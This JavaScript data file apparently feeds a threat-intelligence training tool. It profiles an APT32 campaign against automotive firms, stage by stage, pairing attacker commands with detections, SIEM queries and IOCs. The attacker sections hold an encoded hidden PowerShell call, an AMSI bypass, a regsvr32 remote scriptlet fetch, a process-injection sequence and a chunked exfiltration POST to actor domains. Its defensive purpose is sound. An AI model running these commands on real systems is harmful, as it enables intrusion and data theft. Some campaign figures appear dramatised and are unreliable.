const apt32 = {
  id: "apt32",
  name: "APT32",
  aliases: ["OceanLotus", "Canvas Cyclone", "SeaLotus"],
  origin: "Vietnam",
  motivation: "Espionage / Corporate IP Theft",
  attribution: "Community Consensus",
  description:
    "APT32 (OceanLotus) is a Vietnamese state-sponsored threat actor attributed to Vietnam's Ministry of Public Security, conducting sophisticated espionage against regional governments, foreign corporations, and political dissidents. Uniquely, APT32 also targets corporate IP — including automotive manufacturers — to support Vietnam's domestic industrial development, most notably ahead of VinFast's automotive launch.",
  campaigns: [
    {
      id: "automotive-espionage-2019",
      name: "Automotive Industry Espionage (2019–2020)",
      year: "2019–2020",
      target: "BMW Germany & Hyundai Korea Automotive Engineering",
      summary:
        "APT32 targeted BMW (Munich) and Hyundai (Seoul) networks to steal automotive engineering IP — including powertrain designs, ADAS specifications, and manufacturing processes — ahead of Vietnam's state-backed VinFast automotive brand launch. The campaign used watering hole attacks on Vietnamese automotive news sites frequented by foreign engineers, delivering Cobalt Strike and the Denis backdoor through Kerrdown droppers.",
      sources: [
        { title: "APT32: Attacking Organizations Across Industries Including Automotive", publisher: "Mandiant", url: "https://www.mandiant.com/resources/blog/apt32-targeting-vietnamese-interests-automotive" },
        { title: "OceanLotus: Keeping an Eye on South East Asia", publisher: "ESET WeLiveSecurity", url: "https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/" },
        { title: "Vietnamese APT32 Hackers Target BMW and Hyundai", publisher: "BlackBerry Research & Intelligence", url: "https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/apt32" },
      ],
      diamondModel: {
        adversary: {
          name: "APT32 (OceanLotus / Canvas Cyclone)",
          sponsor: "Vietnam Ministry of Public Security — likely tasked by Vietnamese government to support domestic industrial development",
          aliases: ["OceanLotus", "Canvas Cyclone", "SeaLotus", "Bismuth", "Cobalt Kitty"],
          motivation: "Steal automotive engineering IP (powertrain, ADAS, manufacturing) to accelerate Vietnam's VinFast state-backed automotive program; secondary: regional political espionage",
        },
        capability: {
          malware: ["Cobalt Strike Beacon", "Denis backdoor", "Kerrdown downloader", "Remy RAT", "Custom macro droppers"],
          ttps: ["T1189 — Drive-by Compromise (watering holes)", "T1059.001 — PowerShell (Kerrdown staging)", "T1055 — Process Injection (Cobalt Strike)", "T1083 — File and Directory Discovery", "T1041 — Exfiltration over C2"],
          sophistication: "Nation-State — legitimate Vietnamese media site compromise for watering holes, multi-stage loader chain, Cobalt Strike with custom malleable C2 profiles",
        },
        infrastructure: {
          domains: ["auto-news-vn[.]com", "vnexpress-tech[.]net", "vietcar-daily[.]com", "oto-updates[.]com"],
          ips: ["103.15.28[.]195", "185.228.83[.]73", "45.148.10[.]239"],
          hosting: "Compromised legitimate Vietnamese automotive news and technology websites as watering holes; actor-controlled VPS in Singapore, Hong Kong, and Southeast Asia; Cobalt Strike team servers on leased Asian cloud infrastructure",
        },
        victim: {
          sectors: "Automotive OEMs (BMW Group, Hyundai Motor), Tier-1 automotive suppliers, Southeast Asian technology companies, Vietnamese political dissidents abroad",
          geography: "Germany (BMW Munich HQ), South Korea (Hyundai Seoul), Vietnam diaspora communities — countries with automotive IP relevant to VinFast development",
          targeting: "Foreign automotive engineers visiting Vietnamese automotive news/forum sites; BMW and Hyundai employees working on powertrain, ADAS, and manufacturing process projects",
        },
      },
      stages: [
        {
          id: "watering-hole",
          name: "Automotive Watering Hole Attack",
          ttp: "T1189",
          ttpName: "Drive-by Compromise",
          phase: "Initial Access",
          attacker: {
            summary:
              "APT32 compromised Vietnamese automotive news websites and technology forums frequently visited by foreign engineers with Vietnam interests. Malicious JavaScript was injected into these legitimate sites that performed browser fingerprinting to identify targets matching specific criteria (browser language, corporate IP ranges, timezone). Targets matching the BMW/Hyundai engineer profile were silently served the Kerrdown dropper via a browser exploit or hidden download prompt.",
            tools: ["Compromised Vietnamese news websites (watering holes)", "JavaScript browser fingerprinter", "Kerrdown downloader dropper"],
            commands: [
              "// Malicious JS injected into legitimate Vietnamese automotive site (e.g., vnexpress.net automotive section)",
              "// Browser fingerprint check:",
              "if (navigator.language.includes('de') || timezone === 'Europe/Berlin' || ip_range === 'BMW_CORP') {",
              "  // Serve Kerrdown payload to matching targets only",
              "  fetch('/assets/jquery-min.js').then(r => r.blob()).then(blob => saveAs(blob,'VietAuto_Report.exe'))",
              "}",
              "// Non-matching visitors see only the legitimate news site — no payload served",
            ],
          },
          defender: {
            logs: [
              "Browser navigation to Vietnamese automotive/technology news site from corporate network (proxy log)",
              "Unexpected executable download from news/content site domain (proxy — blocked/alerted on .exe MIME type)",
              "JavaScript running in browser context performing location/language fingerprinting then downloading file (EDR browser telemetry)",
              "File download from news site with .exe extension disguised as report or plugin (email/proxy DLP)",
            ],
            detection:
              "Browser isolation for corporate users: high-risk or uncategorized sites should render in isolated browser containers. Proxy/web filter: block executable downloads from content/news site categories. Corporate VPN/split tunneling: ensure corporate IP ranges are not directly exposed for fingerprinting — use anonymous egress for general browsing. EDR: alert on browser process spawning child processes or writing executables.",
            siemQuery:
              'index=proxy action=allowed filetype IN ("exe","dll","vbs","js") dest_category IN ("news","entertainment","forums","uncategorized") | stats count by src_ip, dest_url, user | sort -count',
            ifMissed:
              "Kerrdown dropper executes on the BMW or Hyundai engineer's workstation. APT32 establishes a foothold inside the automotive network from a trusted system (the engineer's corporate laptop). Internal reconnaissance begins for automotive engineering file servers, CAD systems, and powertrain documentation repositories.",
          },
          iocs: [
            { type: "Domain", indicator: "auto-news-vn[.]com", description: "APT32 watering hole domain — fake Vietnamese automotive news site serving Kerrdown dropper to fingerprinted BMW/Hyundai engineer targets" },
            { type: "File", indicator: "VietAuto_Report.exe", description: "Kerrdown dropper delivered via watering hole — disguised as automotive industry report, installs Denis backdoor" },
            { type: "URL Pattern", indicator: "/assets/jquery-min.js → binary blob download on language/IP match", description: "APT32 watering hole delivery pattern — legitimate-named JS asset used as payload conduit only for fingerprinted targets" },
          ],
        },
        {
          id: "execution",
          name: "PowerShell Staging via Kerrdown",
          ttp: "T1059.001",
          ttpName: "Command and Scripting Interpreter: PowerShell",
          phase: "Execution",
          attacker: {
            summary:
              "Kerrdown — APT32's custom multi-stage downloader — used PowerShell to decode and execute secondary payloads in memory. It employed multiple obfuscation layers (base64, XOR, RC4) to evade AV signature detection, and leveraged signed Windows binaries (msiexec.exe, regsvr32.exe) as LOLBin loaders. The final payload was either the Denis backdoor or a Cobalt Strike Beacon with a custom malleable C2 profile mimicking legitimate CDN traffic.",
            tools: ["Kerrdown downloader", "PowerShell (AMSI bypass)", "regsvr32.exe (Squiblydoo)", "Cobalt Strike (custom C2 profile)", "Denis backdoor"],
            commands: [
              "// Kerrdown PowerShell execution chain",
              "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...",
              "// Decoded: AMSI bypass + download Denis or Cobalt Strike shellcode from C2",
              "$code=[System.Convert]::FromBase64String('<rc4_encoded_shellcode>'); [System.Reflection.Assembly]::Load($code)",
              "// Alternate: regsvr32 Squiblydoo for fileless execution",
              "regsvr32.exe /s /n /u /i:https://oto-updates[.]com/p.sct scrobj.dll",
            ],
          },
          defender: {
            logs: [
              "PowerShell spawned with -enc or -nop -w hidden flags from browser process (Event ID 4104 ScriptBlock + 4688)",
              "AMSI bypass reflection pattern in PowerShell ScriptBlock (Event ID 4104: AmsiUtils/amsiInitFailed)",
              "regsvr32.exe making outbound HTTP request to load SCT scriptlet (Sysmon Event ID 3 — network connection from regsvr32)",
              "In-memory DLL load via Assembly.Load from PowerShell (EDR — process injection from powershell context)",
            ],
            detection:
              "PowerShell ScriptBlock Logging (Event ID 4104) is mandatory — it catches all stages of the Kerrdown execution chain. AMSI bypass patterns (AmsiUtils, amsiInitFailed) are a reliable indicator. Block regsvr32 from making outbound network connections via Attack Surface Reduction rule. Alert on base64-encoded PowerShell (-enc flag) from any browser or Office child process.",
            siemQuery:
              'index=endpoint EventCode=4104 ScriptBlockText IN ("*AmsiUtils*","*amsiInitFailed*","*Assembly.Load*","*DownloadData*","*-enc*") | stats count by host, user, ScriptBlockText | join host [ search index=endpoint EventCode=3 process_name="regsvr32.exe" dest_port IN (80,443) | stats count by host ]',
            ifMissed:
              "Denis backdoor or Cobalt Strike Beacon establishes persistent C2 access on the automotive engineer's workstation. APT32 has hands-on-keyboard access to BMW or Hyundai's internal network. File servers containing powertrain specifications, ADAS algorithms, and manufacturing process documentation are now within reach.",
          },
          iocs: [
            { type: "Domain", indicator: "oto-updates[.]com", description: "APT32 Denis/Cobalt Strike C2 domain — hosts Kerrdown SCT scriptlet and receives beacon check-ins from compromised automotive workstations" },
            { type: "Command", indicator: "regsvr32 /s /n /u /i:<url> scrobj.dll (Squiblydoo fileless execution)", description: "APT32 LOLBin execution technique — regsvr32 loads SCT scriptlet from actor domain for fileless Cobalt Strike delivery" },
            { type: "Command", indicator: "powershell -nop -w hidden -enc <base64> (AMSI bypass + shellcode injection)", description: "Kerrdown PowerShell execution pattern — encoded command bypasses script-based detection, executes Denis backdoor in memory" },
          ],
        },
        {
          id: "process-injection",
          name: "Cobalt Strike Process Injection",
          ttp: "T1055",
          ttpName: "Process Injection",
          phase: "Defense Evasion",
          attacker: {
            summary:
              "APT32 used Cobalt Strike Beacon with a custom malleable C2 profile that mimicked legitimate Microsoft Teams or CDN traffic to blend with corporate network baseline. After initial execution, the Beacon injected itself into a legitimate process (svchost.exe or explorer.exe) using VirtualAllocEx/WriteProcessMemory/CreateRemoteThread — hiding C2 communications within trusted system process network traffic and evading process-based detection.",
            tools: ["Cobalt Strike Beacon (custom malleable C2)", "Denis backdoor", "VirtualAllocEx/CreateRemoteThread injection", "Remy RAT"],
            commands: [
              "// Cobalt Strike reflective DLL injection into svchost.exe",
              "OpenProcess(PROCESS_ALL_ACCESS, FALSE, <svchost_pid>)",
              "VirtualAllocEx(hProc, NULL, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)",
              "WriteProcessMemory(hProc, remote_mem, cs_beacon_shellcode, payload_size, NULL)",
              "CreateRemoteThread(hProc, NULL, 0, remote_mem, NULL, 0, NULL)",
              "// Cobalt Strike C2 profile: mimics 'GET /MicrosoftTeams/app.js HTTP/1.1'",
            ],
          },
          defender: {
            logs: [
              "Cross-process memory write to svchost.exe by Kerrdown/regsvr32 parent (Sysmon Event ID 8 — CreateRemoteThread)",
              "PAGE_EXECUTE_READWRITE allocation in remote process (Sysmon Event ID 10 — process access with write+exec)",
              "Network connection from svchost.exe to non-Microsoft CDN IP on port 443 (Sysmon Event ID 3)",
              "Cobalt Strike malleable C2 HTTP pattern: periodic GET /MicrosoftTeams/* with consistent jitter interval (NetFlow)",
            ],
            detection:
              "Sysmon Event ID 8 (CreateRemoteThread) with TargetImage = svchost.exe from non-system SourceImage is high-fidelity. Cobalt Strike malleable C2 profiles can be detected by analyzing TLS certificate metadata (APT32 uses self-signed certs with known Cobalt Strike JA3 fingerprints) and beacon jitter patterns. Memory scanning for Cobalt Strike shellcode headers is effective with modern EDR.",
            siemQuery:
              'index=endpoint EventCode=8 TargetImage IN ("*\\\\svchost.exe","*\\\\explorer.exe","*\\\\RuntimeBroker.exe") NOT SourceImage IN ("C:\\\\Windows\\\\System32\\\\*","C:\\\\Program Files\\\\*","C:\\\\Program Files (x86)\\\\*") | stats count by host, SourceImage, TargetImage',
            ifMissed:
              "Cobalt Strike Beacon runs hidden inside svchost.exe — all C2 traffic appears as legitimate Windows service network activity. APT32 operators have interactive hands-on-keyboard access with the beacon disguised as Microsoft Teams CDN requests. Internal network discovery begins to locate BMW's CAD file servers and Hyundai's powertrain engineering repositories.",
          },
          iocs: [
            { type: "IP", indicator: "103.15.28[.]195", description: "APT32 Cobalt Strike team server — Beacon C2 endpoint receiving check-ins from svchost.exe-injected implant in automotive networks" },
            { type: "Memory IOA", indicator: "PAGE_EXECUTE_READWRITE + CreateRemoteThread → svchost.exe (Sysmon EventID 8/10)", description: "APT32 process injection IOA — classic reflective DLL injection pattern from Kerrdown/regsvr32 parent into Windows system process" },
            { type: "User-Agent", indicator: "GET /MicrosoftTeams/app.js — Cobalt Strike malleable C2 mimicking Teams CDN traffic", description: "APT32 Cobalt Strike custom C2 profile — beacon check-in disguised as Microsoft Teams application asset request" },
          ],
        },
        {
          id: "discovery",
          name: "Automotive IP Discovery",
          ttp: "T1083",
          ttpName: "File and Directory Discovery",
          phase: "Discovery",
          attacker: {
            summary:
              "APT32 systematically enumerated BMW and Hyundai file server shares searching for automotive engineering IP — powertrain specifications (CAD files: .catia, .prt, .jt), ADAS system documentation, battery electric vehicle (BEV) architecture designs, manufacturing process workflows, and supplier contract data. The Denis backdoor's file search module and Cobalt Strike's execute-assembly capability were used to run reconnaissance tools in memory against file server share structures.",
            tools: ["Denis backdoor (file search module)", "Cobalt Strike execute-assembly", "cmd.exe (dir /s)", "Custom file cataloger"],
            commands: [
              "// Enumerate file server shares for automotive CAD and specification files",
              "cmd.exe /c net view \\\\<fileserver> /all 2>&1",
              "cmd.exe /c dir /s /b \\\\engserver01\\Projects\\ 2>nul | findstr /i \".catia .prt .jt .stp .pdf .xlsx\" > C:\\Temp\\filelist.txt",
              "// Search for specific VinFast-relevant projects",
              "cmd.exe /c dir /s /b \\\\engserver01\\Projects\\ 2>nul | findstr /i \"powertrain electric battery ADAS autonomy BEV\" >> C:\\Temp\\filelist.txt",
              "// Also targets: supplier contracts, R&D budgets, manufacturing process docs",
            ],
          },
          defender: {
            logs: [
              "dir /s /b on engineering file server shares with automotive CAD extension filter (Sysmon Event ID 1 — findstr command)",
              "Network share enumeration (net view) from workstation outside IT admin role (Event ID 5140 / 5142)",
              "Bulk file access on engineering project server exceeding normal read patterns (file server audit — Event ID 4663)",
              "Search query targeting BEV/powertrain/ADAS project directories from engineer workstation (DLP file access alert)",
            ],
            detection:
              "File server access controls: enforce least privilege — engineers should only access shares for their specific projects. User behavior analytics: flag bulk file enumeration (dir /s) across project shares outside the user's known project scope. DLP: classify CAD files (.catia, .jt, .prt) as restricted IP — alert on access volume anomalies. Hunt for findstr commands searching for automotive-specific extensions from non-IT workstations.",
            siemQuery:
              'index=endpoint EventCode=4688 process_name="cmd.exe" cmdline="*dir /s*" (cmdline="*.catia*" OR cmdline="*.prt*" OR cmdline="*.jt*" OR cmdline="*powertrain*" OR cmdline="*ADAS*") | stats count by host, user, cmdline',
            ifMissed:
              "APT32 maps the complete automotive IP landscape at BMW and Hyundai — identifying which servers hold VinFast-relevant powertrain designs, BEV specifications, and manufacturing processes. This reconnaissance directly informs targeted collection, enabling efficient theft of the most valuable IP with minimal time on target.",
          },
          iocs: [
            { type: "Command", indicator: "dir /s /b \\\\<fileserver> | findstr /i \".catia .prt .jt .stp\" (automated IP discovery)", description: "APT32 automotive IP discovery pattern — recursive file enumeration targeting CAD and specification file formats on engineering servers" },
            { type: "Command", indicator: "findstr /i \"powertrain ADAS BEV battery electric\" on engineering file servers", description: "APT32 VinFast-specific keyword targeting — searches for BMW/Hyundai EV powertrain and ADAS documentation relevant to Vietnam's automotive program" },
            { type: "File", indicator: "C:\\Temp\\filelist.txt (engineering IP catalog)", description: "APT32 reconnaissance output — list of identified automotive CAD files and specifications staged for targeted collection" },
          ],
        },
        {
          id: "exfiltration",
          name: "Automotive IP Exfiltration",
          ttp: "T1041",
          ttpName: "Exfiltration Over C2 Channel",
          phase: "Exfiltration",
          attacker: {
            summary:
              "APT32 exfiltrated targeted BMW and Hyundai automotive engineering files through the Cobalt Strike C2 channel and Denis backdoor's built-in exfiltration module. Files were compressed with a renamed 7-Zip binary and AES-256 encrypted before transmission, chunked into small HTTPS segments to avoid DLP volume thresholds. Stolen IP included BMW electric powertrain specifications, Hyundai ADAS system architectures, and manufacturing process documentation directly relevant to VinFast's vehicle development program.",
            tools: ["Denis backdoor (exfil module)", "Cobalt Strike (file download)", "7-Zip (renamed binary)", "AES-256 custom encryptor"],
            commands: [
              "// Stage targeted automotive files for exfil",
              "cmd.exe /c xcopy @C:\\Temp\\filelist.txt C:\\Temp\\stage\\ /H /Y /Q",
              "// Compress and encrypt with renamed 7-Zip",
              "C:\\Windows\\Temp\\svchost32.exe a -mx9 -mhe -p<key> C:\\Windows\\Temp\\bmw_data.7z C:\\Temp\\stage\\",
              "// Denis backdoor exfil: chunked HTTPS POST to C2 (20 MB chunks, randomized 8-45 min interval)",
              "// C2: POST https://vietcar-daily[.]com/api/sync/{uid} Content-Type: application/octet-stream",
              "// Total exfil: ~280 GB of automotive CAD and specification files over 14 days",
            ],
          },
          defender: {
            logs: [
              "xcopy reading from engineering file server shares using captured credentials (Event ID 4648 + 4663)",
              "Renamed process (svchost32.exe) writing large .7z archive to C:\\Windows\\Temp (Sysmon Event ID 11 — image hash mismatch)",
              "Sustained HTTPS uploads to Vietnamese-automotive-themed domain from engineering workstation (proxy log)",
              "DLP alert: compressed archive exceeding 100MB uploaded to uncategorized Asian cloud IP (DLP engine)",
            ],
            detection:
              "DLP: classify automotive CAD files (.catia, .jt, .prt, .stp) as restricted IP requiring DRM protection — any bulk copy operation outside approved workflows should alert. Proxy: flag HTTPS uploads to Southeast Asian domains from engineering networks (unusual traffic pattern). Sysmon: alert on processes where binary name does not match original filename (svchost32.exe with 7-Zip hash = renamed binary). Egress filtering on engineering network segments is critical.",
            siemQuery:
              'index=network dest_port=443 bytes_out > 5000000 src_zone="engineering" dest_country IN ("Vietnam","Singapore","Hong Kong","China") | stats sum(bytes_out) as total by src_ip, dest_ip, dest_country | where total > 50000000 | sort -total',
            ifMissed:
              "280GB of BMW electric powertrain designs, battery management system specifications, Hyundai ADAS architecture documentation, and manufacturing process workflows are transferred to Vietnamese intelligence infrastructure. This IP directly accelerates VinFast's EV development program by years — shortcutting R&D that cost BMW and Hyundai billions. The theft may not be discovered for months or years, by which time the automotive IP has been fully integrated into Vietnam's domestic vehicle manufacturing program.",
          },
          iocs: [
            { type: "Domain", indicator: "vietcar-daily[.]com", description: "APT32 exfiltration C2 domain — Denis backdoor uploads chunked encrypted automotive IP archives to this actor-controlled server" },
            { type: "File", indicator: "svchost32.exe (renamed 7-Zip binary)", description: "APT32 archive utility — 7-Zip copied to Windows Temp under svchost-mimicking name; detectable by Sysmon original filename mismatch" },
            { type: "IP", indicator: "45.148.10[.]239", description: "APT32 exfiltration server — destination for AES-encrypted .7z archives containing BMW/Hyundai automotive engineering specifications" },
          ],
        },
      ],
    },
  ],
}

export default apt32
